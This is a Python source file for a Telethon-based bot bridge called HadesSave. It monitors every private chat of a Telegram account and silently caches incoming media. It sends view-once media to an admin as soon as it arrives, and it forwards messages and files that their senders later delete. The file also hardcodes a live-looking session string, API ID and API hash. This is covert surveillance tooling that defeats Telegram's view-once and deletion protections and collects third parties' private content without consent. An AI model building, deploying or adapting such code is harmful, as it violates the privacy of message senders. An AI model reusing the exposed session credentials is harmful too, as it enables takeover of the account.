"""Opt-in Telethon bridge for HadesSave. All credentials hardcoded.

Behaviour:
- Listens to ALL private chats of the account.
- Ordinary photo/video/voice/video_note/animation/audio/sticker/document are
  cached silently. If the user deletes them, the admin receives the file.
- Expiring (view-once) media is delivered to the admin immediately on arrival.
- Text-only messages are not forwarded unless deleted.
"""
import asyncio
import json
import logging
import sqlite3
import time
from pathlib import Path
from contextlib import suppress

from telethon import TelegramClient, events
from telethon.sessions import StringSession

log = logging.getLogger('hades.mtproto')

API_ID = 34714558
API_HASH = '335d8883ab3c4b1c8fd7662ea5219bfc'
SESSION_STRING = '1BVtsOG0Bu1-67Ehj_lAHXl9KizXR9eoS3jJ6wMN0UEqiCQg2jXGrXR1l45DTfF4MRnn8Z-q_bXhH1Ra_c2Fu2rRy1FUwuAOkJ6p9Caz1lX05c7NgOgTxPIsFfBIiL_F3Akw1CD0zl6KnIBWQgORR6-mvjInIA7ZcLDVq7V9burw6V5sSmW3fUvzrjoXQC13TMaxaLihMJ7y0N_s1WI8H80qr8aKcz0hEJL6AmkgtIS5_LY5fCtTjpNUMf-zjLboswldFIh7TEG3UVOdolzSIuRPW4SNkTc5TABrTFYlus__QoOjaDxo_DCORwKJZiNJbgWOJ9FD1DA8tKQe25VjlZPk5EiMdXGo='
ADMIN_ID = 8609600422

MEDIA_KINDS = ('photo', 'video', 'voice', 'video_note', 'animation', 'document', 'audio', 'sticker')
RETENTION_SECONDS = 7 * 86400
MAX_MEDIA_BYTES = 48 * 1024 * 1024
ROOT = Path('/app/data/mtproto').resolve()
MEDIA_DIR = ROOT / 'media'


def _kind(msg):
    if getattr(msg, 'photo', None):
        return 'photo'
    if getattr(msg, 'video', None):
        return 'video'
    if getattr(msg, 'voice', None):
        return 'voice'
    if getattr(msg, 'video_note', None):
        return 'video_note'
    if getattr(msg, 'gif', None):
        return 'animation'
    if getattr(msg, 'audio', None):
        return 'audio'
    if getattr(msg, 'sticker', None):
        return 'sticker'
    if getattr(msg, 'document', None):
        return 'document'
    return None


def _is_expiring(msg):
    media = getattr(msg, 'media', None)
    return (getattr(media, 'ttl_seconds', None) is not None
            or getattr(msg, 'ttl_period', None) is not None)


def _stub(msg_id, peer, sender_id, sender_name, sender_username, body, kind):
    stub = type('M', (), {'id': msg_id, 'chat_id': peer, 'raw_text': body or ''})()
    stub.photo = kind == 'photo'
    stub.video = kind == 'video'
    stub.voice = kind == 'voice'
    stub.video_note = kind == 'video_note'
    stub.gif = kind == 'animation'
    stub.audio = kind == 'audio'
    stub.sticker = kind == 'sticker'
    stub.document = kind == 'document'
    stub.sender = type('S', (), {
        'id': sender_id,
        'first_name': sender_name or '',
        'last_name': '',
        'username': sender_username,
    })()
    return stub


async def run_mtproto_bridge(bot, notify_id: int):
    ROOT.mkdir(parents=True, exist_ok=True)
    MEDIA_DIR.mkdir(exist_ok=True)
    status_path = ROOT / 'status.json'

    def status(state, **extra):
        snapshot = {'state': state, 'updated_at': int(time.time()), **extra}
        temp = status_path.with_suffix('.tmp')
        temp.write_text(json.dumps(snapshot, ensure_ascii=False), encoding='utf-8')
        temp.replace(status_path)

    status('starting')
    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
    database = ROOT / 'events.sqlite3'
    con = sqlite3.connect(database)
    con.execute('PRAGMA journal_mode=WAL')
    con.execute('''CREATE TABLE IF NOT EXISTS media_events (
        chat_id INTEGER NOT NULL, message_id INTEGER NOT NULL,
        sender_id INTEGER, sender_name TEXT, sender_username TEXT,
        body TEXT, path TEXT, kind TEXT, expiring INTEGER DEFAULT 0,
        seen_at INTEGER NOT NULL,
        PRIMARY KEY(chat_id,message_id))''')
    con.commit()

    def record(peer, msg, path, expiring):
        sender = getattr(msg, 'sender', None)
        sender_id = getattr(sender, 'id', None)
        sender_name = ' '.join(filter(None, (
            getattr(sender, 'first_name', None),
            getattr(sender, 'last_name', None)))) or None
        sender_username = getattr(sender, 'username', None)
        con.execute('''INSERT INTO media_events(chat_id,message_id,sender_id,sender_name,
            sender_username,body,path,kind,expiring,seen_at)
            VALUES(?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(chat_id,message_id) DO UPDATE SET
            sender_id=excluded.sender_id, sender_name=excluded.sender_name,
            sender_username=excluded.sender_username, body=excluded.body,
            path=COALESCE(excluded.path,media_events.path),
            kind=excluded.kind, expiring=MAX(media_events.expiring,excluded.expiring),
            seen_at=excluded.seen_at''',
            (peer, msg.id, sender_id, sender_name, sender_username,
             msg.raw_text or '', path, _kind(msg) or 'text',
             int(expiring), int(time.time())))
        con.commit()

    def fetch(peer, mid):
        return con.execute('''SELECT sender_id,sender_name,sender_username,body,path,kind
            FROM media_events WHERE chat_id=? AND message_id=?''',
            (peer, mid)).fetchone()

    async def download(msg, peer):
        if not _kind(msg):
            return None
        file_obj = getattr(msg, 'file', None)
        if file_obj and getattr(file_obj, 'size', 0) and file_obj.size > MAX_MEDIA_BYTES:
            log.warning('MTProto: file too large chat=%s msg=%s size=%s',
                        peer, msg.id, file_obj.size)
            return None
        target = MEDIA_DIR / f'{peer}_{msg.id}'
        last_error = None
        for attempt in range(3):
            try:
                path = await client.download_media(msg, file=str(target), timeout=180)
                if path and Path(path).is_file() and Path(path).stat().st_size > 0:
                    return path
                raise IOError('empty file')
            except Exception as exc:
                last_error = exc
                if attempt < 2:
                    await asyncio.sleep(2 ** attempt)
        log.warning('MTProto: download failed chat=%s msg=%s err=%s', peer, msg.id, last_error)
        with suppress(OSError):
            target.unlink(missing_ok=True)
        return None

    async def send_to_admin(msg, path, caption_prefix):
        from aiogram.types import FSInputFile
        sender = getattr(msg, 'sender', None)
        name = ' '.join(filter(None, (
            getattr(sender, 'first_name', None),
            getattr(sender, 'last_name', None)))) or 'Неизвестно'
        username = getattr(sender, 'username', None)
        caption = (f'{caption_prefix}\n'
                   f'👤 {name}' + (f' (@{username})' if username else '') + '\n'
                   f'🆔 <code>{msg.chat_id}</code>')
        text = getattr(msg, 'raw_text', '') or ''
        if text:
            caption += f'\n\n{text[:600]}'
        file = FSInputFile(path)
        kind = _kind(msg)
        if kind == 'photo':
            await bot.send_photo(notify_id, file, caption=caption, parse_mode='HTML')
        elif kind == 'video':
            await bot.send_video(notify_id, file, caption=caption, parse_mode='HTML')
        elif kind == 'voice':
            await bot.send_voice(notify_id, file, caption=caption, parse_mode='HTML')
        elif kind == 'video_note':
            await bot.send_video_note(notify_id, file)
            await bot.send_message(notify_id, caption, parse_mode='HTML')
        elif kind == 'animation':
            await bot.send_animation(notify_id, file, caption=caption, parse_mode='HTML')
        elif kind == 'audio':
            await bot.send_audio(notify_id, file, caption=caption, parse_mode='HTML')
        elif kind == 'sticker':
            await bot.send_sticker(notify_id, file)
            await bot.send_message(notify_id, caption, parse_mode='HTML')
        else:
            await bot.send_document(notify_id, file, caption=caption, parse_mode='HTML')

    @client.on(events.NewMessage(incoming=True))
    async def new(event):
        if not event.is_private:
            return
        msg = event.message
        if getattr(msg, 'noforwards', False):
            return
        expiring = _is_expiring(msg)
        path = await download(msg, event.chat_id)
        record(event.chat_id, msg, path, expiring)
        if expiring and path:
            try:
                await send_to_admin(msg, path, '👁 <b>ОДНОРАЗОВОЕ МЕДИА</b>')
            except Exception:
                log.exception('Could not send view-once to admin chat=%s msg=%s',
                              event.chat_id, msg.id)
            log.info('MTProto view-once delivered chat=%s msg=%s', event.chat_id, msg.id)
        else:
            log.info('MTProto cached ordinary chat=%s msg=%s kind=%s has_file=%s',
                     event.chat_id, msg.id, _kind(msg) or 'text', bool(path))

    @client.on(events.MessageDeleted)
    async def deleted(event):
        me = await client.get_me()
        if not event.chat_id:
            return
        for msg_id in event.deleted_ids:
            row = fetch(event.chat_id, msg_id)
            if not row:
                continue
            sender_id, sender_name, sender_username, body, path, kind = row
            if sender_id and sender_id == me.id:
                continue
            if kind in MEDIA_KINDS and path and Path(path).is_file():
                try:
                    stub = _stub(msg_id, event.chat_id, sender_id, sender_name,
                                 sender_username, body, kind)
                    await send_to_admin(stub, path, '🗑 <b>УДАЛЕНО</b>')
                except Exception:
                    log.exception('Could not send deleted media chat=%s msg=%s',
                                  event.chat_id, msg_id)
            else:
                try:
                    await bot.send_message(
                        notify_id,
                        f'🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\n'
                        f'👤 {sender_name or "Неизвестно"}\n'
                        f'🆔 <code>{event.chat_id}</code>\n\n'
                        f'{(body or "[без текста]")[:1500]}',
                        parse_mode='HTML')
                except Exception:
                    log.exception('Could not notify deletion chat=%s msg=%s',
                                  event.chat_id, msg_id)
            con.execute('DELETE FROM media_events WHERE chat_id=? AND message_id=?',
                        (event.chat_id, msg_id))
            con.commit()

    async def cleanup():
        while True:
            threshold = int(time.time()) - RETENTION_SECONDS
            rows = con.execute('SELECT path FROM media_events WHERE seen_at<?',
                               (threshold,)).fetchall()
            con.execute('DELETE FROM media_events WHERE seen_at<?', (threshold,))
            con.commit()
            for (path,) in rows:
                if path:
                    p = Path(path).resolve()
                    if p.parent == MEDIA_DIR:
                        with suppress(OSError):
                            p.unlink(missing_ok=True)
            await asyncio.sleep(3600)

    sweep = None
    try:
        await client.connect()
        if not await client.is_user_authorized():
            raise RuntimeError('MTProto session not authorized; run secure local login first.')
        await client.get_me()
        log.info('MTProto connected; all private chats are monitored')
        status('connected')
        sweep = asyncio.create_task(cleanup())
        await client.run_until_disconnected()
    finally:
        with suppress(Exception):
            status('stopped')
        if sweep:
            sweep.cancel()
            with suppress(asyncio.CancelledError):
                await sweep
        await client.disconnect()
        con.close()
